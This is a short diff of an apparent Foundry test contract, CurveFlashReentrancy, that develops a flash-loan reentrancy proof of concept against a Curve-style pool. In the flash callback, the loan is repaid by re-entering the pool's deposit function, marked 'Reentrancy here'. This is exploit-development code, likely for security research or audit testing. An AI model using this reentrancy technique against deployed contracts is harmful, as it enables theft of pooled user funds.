@@ -39,17 +39,10 @@ contract CurveFlashReentrancy is IFlashCallback, Test {
 
         uint256 amount0Owed = LowGasSafeMath.add(decoded.amount0, fee0);
         uint256 amount1Owed = LowGasSafeMath.add(decoded.amount1, fee1);
-
-        // HACK HERE
-        console.log(IERC20(token0).balanceOf(address(this)));
-        console.log(IERC20(token1).balanceOf(address(this)));
         
+        // Reentrancy here
         // Need to deposit more because of the fee
-        ICurve(curve).deposit(200_000e18, block.timestamp + 1);
-
-
-        // IERC20(token0).safeTransfer(curve, amount0Owed);
-        // IERC20(token1).safeTransfer(curve, amount1Owed);
+        ICurve(curve).deposit(110_000e18, block.timestamp + 1);
     }
 
     function initFlash(address _dfxCurve, FlashParams memory params) external {
